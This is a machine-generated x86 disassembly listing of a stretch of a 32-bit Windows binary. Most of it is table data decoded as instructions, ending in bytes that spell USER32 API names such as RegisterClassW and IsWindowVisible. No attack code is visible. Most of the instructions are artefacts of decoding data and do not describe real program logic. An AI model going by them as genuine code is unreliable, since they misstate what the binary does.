  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx],cl
  41243d:	cmp    al,BYTE PTR [ebx]
  41243f:	add    BYTE PTR [ecx],cl
  412441:	add    eax,DWORD PTR cs:[eax]
	...
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
